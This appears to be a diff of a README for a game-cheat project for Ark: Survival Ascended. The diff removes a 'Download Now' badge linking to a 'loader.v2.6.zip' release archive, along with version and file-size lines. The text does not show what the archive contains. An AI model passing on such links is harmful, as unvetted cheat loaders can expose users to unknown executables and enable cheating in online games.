@@ -1,12 +1,10 @@
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TeamHelpFortress/Humilok/releases/download/v2.6/loader.v2.6.zip)
 
-Latest Version: v1.0.0 • File Size: ~156 MB
 
 🎮 Ark-Survival-Ascended-Cheats
 
 «⚡ A universal project with additional gameplay and visual features»
 
-Latest Version: v1.0.0 • File Size: ~156 MB • Platform: Windows
+
 
 📖 About
 
